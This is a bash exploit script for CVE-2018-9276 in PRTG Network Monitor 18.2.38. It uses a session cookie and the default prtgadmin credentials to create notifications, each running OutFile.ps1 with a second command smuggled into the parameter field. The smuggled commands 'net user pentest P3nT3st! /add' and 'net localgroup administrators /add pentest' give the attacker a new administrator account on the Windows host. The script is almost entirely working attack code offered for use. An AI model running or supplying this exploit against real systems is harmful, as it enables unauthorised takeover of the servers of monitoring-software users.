#!/bin/bash
echo -e "\n\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Authenticated PRTG network Monitor remote code execution                [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Date: 11/03/2019                                                        [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\e[00;32m[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] \e[00m"
echo -e "\e[00;32m[*] Version: 18.2.38                                                        [*] \e[00m"
echo -e "\e[00;32m[*] CVE: CVE-2018-9276                                                      [*] \e[00m"
echo -e "\e[00;32m[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] \e[00m"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"
echo -e "\n\e[00;32m# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.\n# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' \e[00m\n"
echo -e "\e[00;33m[+]#########################################################################[+] \e[00m"


usage()
{
echo -e '\e[00;35m EXAMPLE USAGE:\e[00m\e[00;32m ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1" \e[00m\n'
}

create_file()
{
data="name_=create_file&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.bat&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
fireone=$(curl -s -H "Referer: $url/editnotification.htm?id=new&tabid=1" "X-Requested-With: XMLHttpRequest" -X POST --data "$data" --cookie "$cookie" $url/editsettings)
# use bat file; save file to C:\Users\Public\tester.txt change accordingly
echo "$fireone"
echo -e "\e[00;32m [*] file created \e[00m"
}
ex_notify_1()
{
for i in range {0..50}; do
fireone=$(curl -s -H "Referer: $url/myaccount.htm?tabid=2" "X-Requested-With: XMLHttpRequest" -X POST --data "id=20$i" --cookie "$cookie" $url/api/notificationtest.htm)
# find the id value usually starts at 20.. but may need to change range accordingly
done
echo -e "\e[00;32m [*] sending notification wait....\e[00m"
}

create_user()
{
data2="name_=create_user&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+user+pentest+P3nT3st!+%2Fadd%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
firetwo=$(curl -s -H "Referer: $url/editnotification.htm?id=new&tabid=1" "X-Requested-With: XMLHttpRequest" -X POST --data "$data2" --cookie "$cookie" $url/editsettings)
# use ps1 script to execute code; adding a new user with username pentest and password P3nT3st!
echo "$firetwo"
echo -e "\e[00;32m [*] adding a new user 'pentest' with password 'P3nT3st' \e[00m"
}

ex_notify_2()
{
for i in range {0..50}; do
fire2=$(curl -s -H "Referer: $url/myaccount.htm?tabid=2" "X-Requested-With: XMLHttpRequest" -X POST --data "id=20$i" --cookie "$cookie" $url/api/notificationtest.htm)
# find the id value usually starts at 20.. but may need to change range accordingly
done
echo -e "\e[00;32m [*] sending notification wait....\e[00m"
}

add_user_admin()
{
data3="name_=user_admin&tags_=&active_=1&schedule_=-1%7CNone%7C&postpone_=1&comments=&summode_=2&summarysubject_=%5B%25sitename%5D+%25summarycount+Summarized+Notifications&summinutes_=1&accessrights_=1&accessrights_=1&accessrights_201=0&active_1=0&addressuserid_1=-1&addressgroupid_1=-1&address_1=&subject_1=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&contenttype_1=text%2Fhtml&customtext_1=&priority_1=0&active_17=0&addressuserid_17=-1&addressgroupid_17=-1&message_17=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_8=0&addressuserid_8=-1&addressgroupid_8=-1&address_8=&message_8=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_2=0&eventlogfile_2=application&sender_2=PRTG+Network+Monitor&eventtype_2=error&message_2=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_13=0&sysloghost_13=&syslogport_13=514&syslogfacility_13=1&syslogencoding_13=1&message_13=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_14=0&snmphost_14=&snmpport_14=162&snmpcommunity_14=&snmptrapspec_14=0&messageid_14=0&message_14=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&senderip_14=&active_9=0&url_9=&urlsniselect_9=0&urlsniname_9=&postdata_9=&active_10=0&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&message_10=%22C%3A%5CUsers%5CPublic%5Ctester.txt%3Bnet+localgroup+administrators+%2Fadd+pentest%22&windowslogindomain_10=&windowsloginusername_10=&windowsloginpassword_10=&timeout_10=60&active_15=0&accesskeyid_15=&secretaccesskeyid_15=&arn_15=&subject_15=&message_15=%5B%25sitename%5D+%25device+%25name+%25status+%25down+(%25message)&active_16=0&isusergroup_16=1&addressgroupid_16=200%7CPRTG+Administrators&ticketuserid_16=100%7CPRTG+System+Administrator&subject_16=%25device+%25name+%25status+%25down+(%25message)&message_16=Sensor%3A+%25name%0D%0AStatus%3A+%25status+%25down%0D%0A%0D%0ADate%2FTime%3A+%25datetime+(%25timezone)%0D%0ALast+Result%3A+%25lastvalue%0D%0ALast+Message%3A+%25message%0D%0A%0D%0AProbe%3A+%25probe%0D%0AGroup%3A+%25group%0D%0ADevice%3A+%25device+(%25host)%0D%0A%0D%0ALast+Scan%3A+%25lastcheck%0D%0ALast+Up%3A+%25lastup%0D%0ALast+Down%3A+%25lastdown%0D%0AUptime%3A+%25uptime%0D%0ADowntime%3A+%25downtime%0D%0ACumulated+since%3A+%25cumsince%0D%0ALocation%3A+%25location%0D%0A%0D%0A&autoclose_16=1&objecttype=notification&id=new&targeturl=%2Fmyaccount.htm%3Ftabid%3D2"
firethree=$(curl -s -H "Referer: $url/editnotification.htm?id=new&tabid=1" "X-Requested-With: XMLHttpRequest" -X POST --data "$data3" --cookie "$cookie" $url/editsettings)
echo "$firethree"
echo -e "\e[00;32m [*] adding a user pentest to the administrators group \e[00m"
}

ex_notify_3()
{
for i in range {0..50}; do
fire3=$(curl -s -H "Referer: $url/myaccount.htm?tabid=2" "X-Requested-With: XMLHttpRequest" -X POST --data "id=20$i" --cookie "$cookie" $url/api/notificationtest.htm)
# find the id value usually starts at 20.. but may need to change range accordingly
done
echo -e "\e[00;32m [*] sending notification wait....\e[00m"
echo -e "\n\n\e[00;32m [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! \e[00m"
}

if [[ $# -eq 0 ]] ; then
    usage
    exit 0
fi

while getopts "hu:c:" option; do
 case "${option}" in
    c) cookie=${OPTARG};;
    h) usage;;
    u) url=${OPTARG};;
    *) usage; exit;;
  esac
done

create_file
ex_notify_1
sleep 3
create_user
ex_notify_2
sleep 3
add_user_admin
ex_notify_3